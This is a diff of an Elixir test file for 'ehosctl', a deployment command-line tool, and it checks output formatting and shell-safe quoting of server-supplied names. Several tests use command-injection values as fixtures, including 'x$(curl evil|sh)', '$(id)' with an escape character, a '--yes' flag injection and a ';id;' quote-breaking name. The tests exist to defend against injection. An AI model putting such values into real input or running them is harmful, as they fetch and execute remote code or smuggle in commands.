@@ -8,7 +8,7 @@ defmodule Ehosctl.DeployBuildTest do
   @digest String.duplicate("a1", 32)
   @image "ghcr.io/example/ledger@sha256:#{@digest}"
   @manifest ~s({"schema": "ehos.manifest/v3",\n  "application": "ledger", "capabilities": []}\n)
-  @graph ~s({"schema": "eh_os_contract.graph.v1", "kind": "domain", "label": "Księga"}\n)
+  @graph ~s({"schema": "ehos_contract.graph.v1", "kind": "domain", "label": "Księga"}\n)
   @build "0b6f4c1e-6a8e-4f3e-9d61-2c1a7c2f9e10"
   @commit String.duplicate("c0ffee12", 5)
 
@@ -20,13 +20,19 @@ defmodule Ehosctl.DeployBuildTest do
     "template" => "small",
     "expires_at" => "2026-11-05T09:00:00Z"
   }
-  @created_said "Created ledger-try, ephemeral, for ledger from the environment template " <>
-                  "small, expires at 2026-11-05T09:00:00Z. Run `ehosctl env extend` to give it " <>
-                  "more time.\n"
+  # What `env create` says of `@created`, on stderr when `deploy --create-env` creates it: no
+  # command under Next, which the deployment's own outcome gives.
+  @created_said "✓ Created ledger-try.\n" <>
+                  "  Type                   ephemeral\n  Application            ledger\n  Environment template   small\n" <>
+                  "  Expires                5 November 2026, 09:00 UTC\n"
   @stays "The ephemeral environment ledger-try, which ehosctl created for the deployment, " <>
            "stays until it expires. Run `ehosctl env remove ledger-try` to remove it.\n"
   @at_application "This application has the maximum number of ephemeral environments: 3. " <>
                     "Remove one, then try again."
+
+  # A name with `$(…)`, a single quote and ESC: a shell would expand the first in double quotes,
+  # and a terminal would act on the last, so no command offered to paste may hold it.
+  @odd "x$(id)'\e"
 
   setup %{provider: provider, opts: opts} do
     login!(provider, opts)
@@ -63,13 +69,17 @@ defmodule Ehosctl.DeployBuildTest do
       {0, stdout, ""} = ehosctl(deploy(["--build", @build, "--no-wait"]), opts)
 
       assert stdout == """
-             Deployed ledger to staging: deployment d-1 is activating.
-               image:            #{@image}
-               build:            #{@build}
-               source:           from GitHub's token: example/ledger, branch main, commit #{@commit}, run 51001 (attempt 1)
-               manifest digest:  sha256:b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2
-               authority digest: sha256:c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3
-             Open the page of the application in the console to see if it became active.
+             ✓ EHOS decided a deployment of ledger to staging.
+               Deployment         d-1
+               State              activating
+               Image              #{@image}
+               Build              #{@build}
+               Source             from GitHub's token: example/ledger, branch main, commit #{@commit}, run 51001 (attempt 1)
+               Manifest digest    sha256:b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2
+               Authority digest   sha256:c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3
+
+             Next:
+               ehosctl apps history ledger --env staging --installation local
              """
 
       assert requests(provider) == [
@@ -133,18 +143,25 @@ defmodule Ehosctl.DeployBuildTest do
          %{provider: provider, opts: opts} do
       answer(provider, 201, deployment(@build))
 
-      {0, stdout, ""} = ehosctl(deploy(["--build", @build]), opts)
+      {0, stdout, stderr} = ehosctl(deploy(["--build", @build]), opts)
 
       assert stdout == """
-             Deployed ledger to staging: deployment d-1 is activating.
-               image:            #{@image}
-               build:            #{@build}
-               source:           from GitHub's token: example/ledger, branch main, commit #{@commit}, run 51001 (attempt 1)
-               manifest digest:  sha256:b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2
-               authority digest: sha256:c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3
-             ehosctl waits until the deployment is active, for at most 10 minutes:
-               active
-             Deployment d-1 is active in staging, at https://ledger.staging.example.com.
+             ✓ EHOS decided a deployment of ledger to staging.
+               Deployment         d-1
+               State              activating
+               Image              #{@image}
+               Build              #{@build}
+               Source             from GitHub's token: example/ledger, branch main, commit #{@commit}, run 51001 (attempt 1)
+               Manifest digest    sha256:b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2
+               Authority digest   sha256:c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3
+
+             ✓ Deployment d-1 is active in staging.
+               Address   https://ledger.staging.example.com
+             """
+
+      assert stderr == """
+             ==> Waiting until the deployment is active, for at most 10 minutes
+             ==> State of the deployment: active
              """
     end
 
@@ -226,6 +243,17 @@ defmodule Ehosctl.DeployBuildTest do
                  "--repository owner/name.\n"
     end
 
+    test "leaves out the command to list the builds when the application's name holds a character a terminal acts on",
+         %{provider: provider, opts: opts} do
+      answer(provider, 404, %{
+        "error" => "build_not_found",
+        "message" => "No build of the application matches."
+      })
+
+      assert ehosctl(["deploy", @odd, "--env", "staging", "--build", @commit], opts) ==
+               {1, "", "ehosctl: No build of the application matches.\n"}
+    end
+
     test "says how to reach production, which takes a version only by a promotion",
          %{provider: provider, opts: opts} do
       answer(provider, 409, %{
@@ -239,6 +267,19 @@ defmodule Ehosctl.DeployBuildTest do
                   "an ephemeral environment of ledger first. Then run `ehosctl promote ledger " <>
                   "--candidate DEPLOYMENT --env production`.\n"}
     end
+
+    test "says to promote, without the command, when the application's name holds a character a terminal acts on",
+         %{provider: provider, opts: opts} do
+      answer(provider, 409, %{
+        "error" => "promotion_required",
+        "message" => "Production takes a version only by a promotion."
+      })
+
+      assert ehosctl(["deploy", @odd, "--env", "production", "--build", @commit], opts) ==
+               {1, "",
+                "ehosctl: Production takes a version only by a promotion. Deploy the version to " <>
+                  ~S[an ephemeral environment of "x$(id)'\e" first. Then promote it.] <> "\n"}
+    end
   end
 
   describe "deploy --build --create-env" do
@@ -251,10 +292,7 @@ defmodule Ehosctl.DeployBuildTest do
       {0, stdout, stderr} = ehosctl(create_env("ledger-try", ["--template", "small"]), opts)
 
       assert {String.split(stdout, "\n") |> hd(), stderr} ==
-               {"Deployed ledger to ledger-try: deployment d-1 is activating.",
-                "Created ledger-try, ephemeral, for ledger from the environment template small, " <>
-                  "expires at 2026-11-05T09:00:00Z. Run `ehosctl env extend` to give it more " <>
-                  "time.\n"}
+               {"✓ EHOS decided a deployment of ledger to ledger-try.", @created_said}
 
       assert json_requests(provider, "POST /api/v1/environments") == [
                json_request("/api/v1/environments", %{
@@ -278,10 +316,11 @@ defmodule Ehosctl.DeployBuildTest do
       {0, _stdout, stderr} = ehosctl(create_env("ledger-try", ["--no-role-bindings"]), opts)
 
       assert stderr ==
-               "Created ledger-try, ephemeral, for ledger from the environment template small, " <>
-                 "expires at 2026-11-05T09:00:00Z. It has no role bindings and no people " <>
-                 "agreement from the environment template. Run `ehosctl env extend` to give it " <>
-                 "more time.\n"
+               "✓ Created ledger-try.\n" <>
+                 "  Type                   ephemeral\n  Application            ledger\n  Environment template   small\n" <>
+                 "  Expires                5 November 2026, 09:00 UTC\n" <>
+                 "  It has no role bindings and no people agreement from the environment " <>
+                 "template.\n"
 
       assert json_requests(provider, "POST /api/v1/environments") == [
                json_request("/api/v1/environments", %{
@@ -308,6 +347,24 @@ defmodule Ehosctl.DeployBuildTest do
                   "--no-role-bindings` and deploy to it.\n"}
 
       assert FakeProvider.requests(provider, "POST /api/v1/environments") == []
+      assert requests(provider) == []
+    end
+
+    test "--no-role-bindings says how to do without, without the command, when the application's name holds a character a terminal acts on",
+         %{provider: provider, opts: opts} do
+      api(provider, "GET", "/api/v1/environments/ledger-try", 200, %{
+        "environment" => Map.merge(@created, %{"bindings" => [], "template_entries" => true})
+      })
+
+      args = ["deploy", @odd, "--env", "ledger-try", "--build", @build, "--create-env"]
+
+      assert ehosctl(args ++ ["--no-role-bindings"], opts) ==
+               {2, "",
+                "ehosctl: EHOS made ledger-try with the role entries and the people agreement of " <>
+                  "its environment template, and --no-role-bindings cannot take them away. " <>
+                  "ehosctl deployed nothing. Deploy without --no-role-bindings, or deploy to " <>
+                  "another environment that you create with --no-role-bindings.\n"}
+
       assert requests(provider) == []
     end
 
@@ -342,8 +399,8 @@ defmodule Ehosctl.DeployBuildTest do
                ehosctl(create_env("ledger-try", ["--no-role-bindings"]), opts)
 
       assert stderr ==
-               "EHOS did not say if it made ledger-try with the role entries and the people " <>
-                 "agreement of its environment template. ehosctl deploys to it: " <>
+               "! EHOS did not say if it made ledger-try with the role entries and the people " <>
+                 "agreement of its environment template.\n  ehosctl deploys to it: " <>
                  "--no-role-bindings applies only to an environment that ehosctl creates.\n"
 
       assert length(requests(provider)) == 1
@@ -370,12 +427,24 @@ defmodule Ehosctl.DeployBuildTest do
 
       {0, _stdout, stderr} = ehosctl(create_env("ledger-try", ["--no-role-bindings"]), opts)
 
+      # The warning comes after the environment's outcome, which it belongs to.
       assert stderr ==
                @created_said <>
-                 "EHOS did not confirm that it made ledger-try without the role entries and the " <>
-                 "people agreement of the environment template. This version of EHOS may not " <>
-                 "know --no-role-bindings. Run `ehosctl role-bindings list` to see the role " <>
-                 "bindings in it.\n"
+                 "! EHOS did not confirm that it made ledger-try without the role entries and " <>
+                 "the people agreement of the environment template.\n  This version of EHOS may " <>
+                 "not know --no-role-bindings. Run `ehosctl role-bindings list --installation " <>
+                 "local` to see the role bindings in it.\n"
+    end
+
+    test "--json --no-role-bindings prints no warning when EHOS does not say it left them out",
+         %{provider: provider, opts: opts} do
+      no_environment(provider, "ledger-try")
+      created(provider, 201, %{"environment" => @created})
+      deploys_once_created(provider)
+
+      {0, stdout, ""} = ehosctl(create_env("ledger-try", ["--no-role-bindings", "--json"]), opts)
+
+      assert JSON.decode!(stdout)["created_environment"] == @created
     end
 
     test "--json says the environment it created beside the deployment",
@@ -434,8 +503,8 @@ defmodule Ehosctl.DeployBuildTest do
                 """
                 ehosctl: #{@at_application}
                 These ephemeral environments count toward the maximum of 3:
-                 ENVIRONMENT   APPLICATION  EXPIRES               BUILD
-                 ledger-pr-12  ledger       2026-11-05T09:00:00Z  -
+                 ENVIRONMENT   APPLICATION  EXPIRES                     BUILD
+                 ledger-pr-12  ledger       5 November 2026, 09:00 UTC  <none>
                 Run `ehosctl env remove ENVIRONMENT` to remove one.
                 """}
 
@@ -443,6 +512,39 @@ defmodule Ehosctl.DeployBuildTest do
       assert JSON.decode!(stderr)["error"]["code"] == "too_many_for_application"
 
       assert requests(provider) == []
+    end
+
+    test "quotes for a shell the name EHOS gives the environment it created, in the command to remove it",
+         %{provider: provider, opts: opts} do
+      no_environment(provider, "ledger-try")
+      created(provider, 201, %{"environment" => %{@created | "name" => "x$(curl evil|sh)"}})
+      answer(provider, 409, %{"error" => "no_room", "message" => "The quota has no room."})
+
+      {1, "", stderr} = ehosctl(create_env("ledger-try", []), opts)
+
+      assert stderr |> String.split("\n") |> Enum.take(-2) ==
+               [
+                 "The ephemeral environment x$(curl evil|sh), which ehosctl created for the " <>
+                   "deployment, stays until it expires. Run `ehosctl env remove 'x$(curl evil|sh)'` " <>
+                   "to remove it.",
+                 ""
+               ]
+    end
+
+    test "leaves out the command to remove the environment it created when EHOS names it with a leading dash or a backslash",
+         %{provider: provider, opts: opts} do
+      # `--yes` would reach `env remove` as its flag, and fish reads a backslash in single quotes.
+      for name <- ["--yes", ~S{x\';id;\'}] do
+        no_environment(provider, "ledger-try")
+        created(provider, 201, %{"environment" => %{@created | "name" => name}})
+        answer(provider, 409, %{"error" => "no_room", "message" => "The quota has no room."})
+
+        assert ehosctl(create_env("ledger-try", []), opts) ==
+                 {1, "",
+                  String.replace(@created_said, "ledger-try", name) <>
+                    "ehosctl: The quota has no room.\nThe ephemeral environment #{name}, which " <>
+                    "ehosctl created for the deployment, stays until it expires.\n"}
+      end
     end
 
     test "when EHOS refuses the deployment, says that the environment it created stays",
@@ -547,8 +649,8 @@ defmodule Ehosctl.DeployBuildTest do
                  "kind" => "refused",
                  "code" => "forbidden",
                  "message" =>
-                   "You may not read them. EHOS decided deployment d-1. Run `ehosctl apps show " <>
-                     "ledger` to see its state.",
+                   "You may not read them. EHOS decided deployment d-1. Open the page of ledger in " <>
+                     "the console to see its state.",
                  "created_environment" => @created
                }
              }
@@ -562,11 +664,8 @@ defmodule Ehosctl.DeployBuildTest do
 
       {0, _stdout, stderr} = ehosctl(create_env("ledger-pr-12", []), opts)
 
-      assert hd(String.split(stderr, "\n")) ==
-               "If the repository previews pull requests, the pipeline of a pull request " <>
-                 "deploys to ledger-pr-12. Its deployment replaces yours there and withdraws a " <>
-                 "promotion that waits for a candidate there. When the pull request closes, its " <>
-                 "pipeline can remove ledger-pr-12."
+      assert stderr ==
+               pr_warning() <> String.replace(@created_said, "ledger-try", "ledger-pr-12")
 
       # Without --create-env too, and never under --json, as the pull request's own run deploys.
       {0, _stdout, stderr} =
@@ -575,7 +674,7 @@ defmodule Ehosctl.DeployBuildTest do
           opts
         )
 
-      assert stderr =~ "the pipeline of a pull request deploys to ledger-pr-12."
+      assert stderr == pr_warning()
 
       assert {0, _stdout, ""} =
                ehosctl(create_env("ledger-pr-12", ["--json"]), opts)
@@ -599,6 +698,23 @@ defmodule Ehosctl.DeployBuildTest do
       assert stderr =~ "run `ehosctl env create ledger-try --app ledger --no-role-bindings` if"
 
       assert FakeProvider.requests(provider, "POST /api/v1/environments") == []
+      assert requests(provider) == []
+    end
+
+    test "in a pipeline, says to create the environment first, without the command, when the environment template's name holds a character a terminal acts on",
+         %{provider: provider, opts: opts} do
+      api(provider, "GET", "/api/v1/environments/ledger-try", 403, %{
+        "error" => "deployment_identity"
+      })
+
+      assert ehosctl(create_env("ledger-try", ["--template", @odd]), opts) ==
+               {3, "",
+                "ehosctl: A pipeline's credential may only make, deploy to and remove its " <>
+                  "application's ephemeral environments. --create-env reads the environment " <>
+                  "first, which a pipeline's credential cannot. In a GitHub Actions job, create " <>
+                  "the environment with `ehosctl env create` if it does not exist, then deploy " <>
+                  "without --create-env.\n"}
+
       assert requests(provider) == []
     end
 
@@ -644,15 +760,19 @@ defmodule Ehosctl.DeployBuildTest do
         ehosctl(deploy(["--bundle", dir, "--image", @image, "--no-wait"]), opts)
 
       assert stdout == """
-             Deployed ledger to staging: deployment d-1 is activating.
-               image:            #{@image}
-               manifest digest:  sha256:b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2
-               authority digest: sha256:c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3
-             Open the page of the application in the console to see if it became active.
+             ✓ EHOS decided a deployment of ledger to staging.
+               Deployment         d-1
+               State              activating
+               Image              #{@image}
+               Manifest digest    sha256:b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2b2
+               Authority digest   sha256:c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3c3
+
+             Next:
+               ehosctl apps history ledger --env staging --installation local
              """
 
       assert stderr ==
-               "Sending with the application manifest: 1 graph document, #{byte_size(@graph)} bytes in all.\n"
+               "==> Sending with the application manifest: 1 graph document, #{byte_size(@graph)} bytes in all.\n"
 
       # The multipart body's boundary is a random one, so its parts are read by it.
       assert [
@@ -716,7 +836,20 @@ defmodule Ehosctl.DeployBuildTest do
 
       assert stderr ==
                "ehosctl: --preview does not accept --bundle: EHOS previews only the application " <>
-                 "manifest. Give --manifest #{file} to preview it.\n"
+                 "manifest. Give `--manifest #{EhosPlatform.Shell.word(file)}` to preview it.\n"
+
+      # The path quoted for a shell, and left out where it would not paste as it is.
+      for {bundle, said} <- [
+            {"it's x$(id)",
+             ~S{Give `--manifest 'it'\''s x$(id)/ehos.manifest.json'` to preview it.}},
+            {~S{a\b}, "Give --manifest with the bundle's ehos.manifest.json to preview it."},
+            {"x\e", "Give --manifest with the bundle's ehos.manifest.json to preview it."}
+          ] do
+        assert ehosctl(deploy(["--bundle", bundle, "--preview"]), opts) ==
+                 {2, "",
+                  "ehosctl: --preview does not accept --bundle: EHOS previews only the " <>
+                    "application manifest. " <> said <> "\n"}
+      end
 
       {2, "", stderr} = ehosctl(deploy(["--image", @image]), opts)
 
@@ -777,4 +910,13 @@ defmodule Ehosctl.DeployBuildTest do
     }
 
   defp requests(provider), do: FakeProvider.requests(provider, "POST /api/v1/deployments")
+
+  # The warning for ledger-pr-12, the name a pull request's preview gets.
+  defp pr_warning do
+    "! ledger-pr-12 is named as the preview of a pull request.\n" <>
+      "  If the repository previews pull requests, the pipeline of a pull request deploys to " <>
+      "ledger-pr-12. Its deployment replaces yours there and withdraws a promotion that waits " <>
+      "for a candidate there. When the pull request closes, its pipeline can remove " <>
+      "ledger-pr-12.\n"
+  end
 end
